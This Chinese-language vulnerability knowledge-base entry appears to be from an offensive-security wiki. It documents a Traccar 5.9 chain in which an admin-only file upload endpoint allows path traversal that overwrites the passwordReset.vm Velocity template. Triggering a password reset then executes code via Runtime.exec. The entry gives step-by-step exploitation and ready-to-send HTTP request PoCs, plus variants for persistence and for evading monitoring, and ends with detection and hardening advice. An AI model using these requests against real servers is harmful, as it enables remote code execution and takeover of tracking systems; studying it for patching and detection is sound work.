---
id: web-generic-file-upload-traccar-path-traversal-template-overwrite-rce
title: Traccar 5.9 后台路径穿越任意文件写：覆盖 templates/full/passwordReset.vm，触发密码重置渲染 Velocity 载荷 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: traccar-upload-path-traversal-template-overwrite-rce
tags:
- web
- file-upload
- path-traversal
- arbitrary-file-write
- velocity
- ssti
- java
- jersey
- traccar
- rce
- template
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: Traccar 5.9（Windows 64 位安装包，原文实测版本）
verification:
  verified_by: verifier-V657
  verified_at: '2026-11-13T06:38:10+08:00'
  notes: 已对照原文核对 Traccar 5.9（traccar-windows-64-5.9.zip，原文实测版本）uploadImage 路径穿越、templates/full/passwordReset.vm 覆盖、/api/password/reset 触发 Velocity 载荷与 pwn.txt 验证；未实机复现
url: /docs/web/generic/file-upload/web-generic-file-upload-traccar-path-traversal-template-overwrite-rce/
draft: false
kb_aliases:
- Traccar 任意文件上传
- /api/server/file 路径穿越
- passwordReset.vm 模板覆盖
- Traccar Velocity 模板 RCE
- uploadImage 任意写
---

## 一句话结论

Traccar 5.9 的后台接口 `POST /api/server/file/{path}` 把 URL 中的 `path` 原样拼进 `Paths.get(root, path)` 写文件，未做规范化与白名单校验，管理员（含首个注册账号）可用 `..%2f` 穿越到安装目录覆盖外部 Velocity 模板 `templates/full/passwordReset.vm`；随后请求 `/api/password/reset` 触发该模板渲染，模板里的反射表达式即被执行，以服务账号权限 RCE。

## 原理

- **鉴权模型**：Traccar 基于 Jersey（`/api/*` Servlet），`SecurityRequestFilter` 对未标注 `@PermitAll` 的资源方法强制登录；`uploadImage` 还额外 `permissionsService.checkAdmin(getUserId())`。也就是说这不是未授权漏洞，而是"管理员权限 → 服务器 RCE"的提权/持久化链（首个注册账号默认是管理员）。
- **路径穿越写入**：接口签名为 `@Path("file/{path}") @POST @Consumes("*/*") uploadImage(@PathParam("path") String path, File inputFile)`，内部直接 `var outputPath = Paths.get(root, path);`，root 为 `WEB_OVERRIDE`/`WEB_PATH` 配置目录。`Path` 拼接不替换或拒绝 `..`，Jersey 又把 URL 编码的 `%2f` 解码为 `/`，因此 `path=../templates/full/passwordReset.vm` 最终写到应用根目录下的 `templates/full/`；`Files.createDirectories(outputPath.getParent())` 还会补建缺失目录，请求体（任意 Content-Type）通过 `FileInputStream.transferTo` 原样落盘。
- **为什么覆盖模板等于 RCE**：Traccar 以 jar 方式运行，但模板文件放在 jar 外的 `templates/` 目录，由 Apache Velocity（build.gradle 引入 velocity-engine-core 2.3 / velocity-tools-generic 3.1）从文件系统加载。"找回密码"流程会用 `templates/full/passwordReset.vm` 渲染邮件内容；攻击者覆盖该文件后，下一次 `POST /api/password/reset` 就会把恶意内容当作模板源码解析。
- **Velocity 反射执行**：Velocity 默认 Uberspector 允许 `#set` 与方法调用，`$exp.getClass().forName("java.lang.Runtime").getRuntime().exec(...)` 可加载 Runtime 并执行命令；因此模板文件可控即可命令执行，无需再找文件包含/解析漏洞。

## 触发条件

- 目标为 Traccar 5.9（原文实测 Windows 64 位安装包；其他版本若保留同一 `uploadImage` 实现亦可）。
- 攻击者持有管理员账号或有效管理员会话（首个注册账号即管理员；或通过弱口令/会话窃取获得）。
- 安装目录中的 `templates/` 对 Traccar 服务账号可写（默认安装到 `C:\Program Files\Traccar`，服务以本地系统/服务账号运行时可写）。
- 密码重置等业务流程会渲染被覆盖的 `.vm` 模板。

## 利用步骤

1. 以管理员身份登录 Web 控制台，取得 `JSESSIONID`。
2. 向 `POST /api/server/file/..%2ftemplates%2ffull%2fpasswordReset.vm` 发送 Velocity 恶意模板作为请求体（Content-Type 任意，原文用 `image/jpeg`），覆盖密码重置模板。
3. 向 `POST /api/password/reset` 提交管理员邮箱，触发密码重置邮件渲染。
4. 模板中的表达式在服务端执行；原文在安装目录生成 `pwn.txt`，证明 RCE。

## PoC

```http
POST /api/server/file/..%2ftemplates%2ffull%2fpasswordReset.vm HTTP/1.1
Host: target:8082
Cookie: JSESSIONID=<admin_session>
Content-Type: image/jpeg

#set($subject = "Password reset")
<!DOCTYPE html>
<html><body>
<a href="$webUrl/reset-password?passwordReset=$token">reset</a>
</body></html>
#set ($exp = "exp");$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("cmd.exe /c echo aaa > pwn.txt");
```

```http
POST /api/password/reset HTTP/1.1
Host: target:8082
Cookie: JSESSIONID=<admin_session>
Content-Type: application/x-www-form-urlencoded

email=<admin_email>
```

执行后在 `C:\Program Files\Traccar\pwn.txt` 观察结果。

## 变体与关联

- 变体：覆盖其他业务模板（如注册确认、通知邮件等 `templates/full/*.vm`），由对应业务流程触发，规避密码重置接口的额外监控。
- 变体：不追求 RCE 时，任意文件写本身可覆盖配置/静态资源，或在服务账号可写的启动目录布置持久化。
- 边界：模板若打包进 jar 或目录不可写，模板覆盖链不成立；此时仍保留"管理员任意文件写"本体。
- 关联：[[web-generic-ssti-velocity-evaluate-string-template-rce]]（Velocity 反射执行原理与载荷）、[[web-generic-file-upload-zipslip-template-overwrite-context-variable-leak]]（另一条覆盖模板的写入路径）、[[web-generic-file-upload-fastcms-template-upload-filename-traversal]]（文件名穿越写任意文件）。

## 检测与防御

- 对上传/写入路径做规范化：`resolve` 后校验 `startsWith(root)`，拒绝含 `..`、绝对路径、编码分隔符的输入；不要提供"路径由请求决定"的通用写接口。
- 上传目录与模板/配置/可执行目录隔离，服务账号对模板目录只读；模板加载启用 Velocity SecureUberspector 或白名单方法。
- 监控 `templates/` 等目录的文件完整性（哈希/时间戳告警）、异常 `%2f`/`..` 请求与密码重置接口的异常调用。
- 管理员账号最小化、强口令与 MFA；升级到修复该接口的 Traccar 版本。
